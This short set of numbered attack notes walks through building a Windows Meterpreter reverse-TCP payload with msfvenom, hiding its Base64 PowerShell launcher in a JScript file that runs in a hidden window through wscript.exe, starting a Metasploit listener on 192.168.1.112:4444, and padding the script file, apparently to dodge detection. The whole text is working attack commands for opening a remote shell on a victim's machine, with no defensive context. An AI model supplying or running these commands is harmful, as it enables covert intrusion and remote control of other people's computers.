1. Generate the PowerShell launcher with msfvenom

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.112 LPORT=4444 -f psh-cmd

2. Wrap it in JavaScript (.js) for wscript.exe

var shell = new ActiveXObject("WScript.Shell");
var cmd = 'powershell -nop -w hidden -e <Base64Payload>';
shell.Run(cmd, 0);  // 0 = hidden

3. Listener Setup in Metasploit

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.112; set LPORT 4444; exploit"

4. pad js

powershell -ExecutionPolicy Bypass -File padding-beginning-js.ps1 -InputFile .\meterpreter_windows_reverseshell.js
powershell -ExecutionPolicy Bypass -File padding-end-js.ps1 -InputFile .\meterpreter_windows_reverseshell.js
